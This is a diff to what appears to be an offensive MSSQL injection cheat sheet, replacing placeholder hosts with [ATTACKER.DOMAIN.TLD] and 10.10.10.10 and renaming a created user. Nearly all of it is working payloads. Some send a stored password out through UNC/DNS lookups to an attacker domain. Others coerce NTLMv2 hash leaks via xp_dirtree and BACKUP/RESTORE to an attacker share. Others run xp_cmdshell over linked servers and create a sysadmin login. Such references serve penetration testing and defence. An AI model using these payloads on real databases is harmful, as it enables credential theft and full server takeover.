@@ -304,14 +304,14 @@ Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578
 * **Permission**: Requires `VIEW SERVER STATE` permission on the server.
 
     ```powershell
-    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.xem',null,null))
     ```
 
 * **Permission**: Requires the `CONTROL SERVER` permission.
 
     ```powershell
-    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
-    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
+    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\',default,default)))
+    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.trc',default))
     ```
 
 ### MSSQL UNC Path
@@ -319,21 +319,21 @@ Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578
 MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
 
 ```sql
-1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';-- 
 ```
 
 ```sql
-xp_dirtree '\\attackerip\file'
-xp_fileexist '\\attackerip\file'
-BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
-BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
-RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
-RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
-RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
-RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
-RESTORE LABELONLY FROM DISK = '\\attackerip\file'
-RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
-RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+xp_dirtree '\\10.10.10.10\file'
+xp_fileexist '\\10.10.10.10\file'
+BACKUP LOG [TESTING] TO DISK = '\\10.10.10.10\file'
+BACKUP DATABASE [TESTING] TO DISK = '\\10.10.10.10\file'
+RESTORE LOG [TESTING] FROM DISK = '\\10.10.10.10\file'
+RESTORE DATABASE [TESTING] FROM DISK = '\\10.10.10.10\file'
+RESTORE HEADERONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE FILELISTONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE LABELONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE REWINDONLY FROM DISK = '\\10.10.10.10\file'
+RESTORE VERIFYONLY FROM DISK = '\\10.10.10.10\file'
 ```
 
 ## MSSQL Trusted Links
@@ -366,8 +366,8 @@ A trusted link in Microsoft SQL Server is a linked server relationship that allo
     select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
 
     -- Create a SQL user and give sysadmin privileges
-    EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
-    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
+    EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
+    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
     ```
 
 ## MSSQL Privileges
@@ -402,7 +402,7 @@ A trusted link in Microsoft SQL Server is a linked server relationship that allo
 ### MSSQL Make User DBA
 
 ```sql
-EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';
 ```
 
 ## MSSQL Database Credentials
